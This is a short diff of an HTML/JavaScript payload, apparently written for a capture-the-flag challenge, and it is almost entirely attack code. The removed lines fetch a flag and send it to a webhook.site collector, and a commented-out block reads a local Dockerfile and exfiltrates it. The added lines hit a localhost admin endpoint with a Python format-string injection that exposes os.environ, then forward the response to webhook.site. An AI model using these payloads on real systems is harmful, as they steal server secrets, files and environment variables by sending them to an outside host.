@@ -1,18 +1,6 @@
 
 <script>
-    fetch('http://paranormal-picture.niccgetsspooky.xyz/flag')
-  .then(response => response.text())
-  .then(data => {fetch(`https://webhook.site/636939f8-5e7b-47f2-9184-280a7941e150/flag=${data}`)});
+    fetch('https://localhost:5000/admin?prompt={0.__globals__[app].__class__.__init__.__globals__[os].environ}')
+    .then(response => response.text())
+    .then((html) => {fetch(`https://webhook.site/c0222710-d940-4f5f-892f-28d04b138fbe/?body=${html}`)});
 </script>
-
-<!-- <script>
-var xhr = new XMLHttpRequest();
-xhr.open('GET', 'file:///app/Dockerfile', true);
-xhr.onreadystatechange = function () {
-    if (xhr.readyState === 4 && xhr.status === 200) {
-        fetch(`https://webhook.site/4e7b8828-d10a-43fb-b659-1b2f40d641b6/?flag=${xhr.responseText}`); 
-    }
-};
-xhr.send();
-
-</script> -->
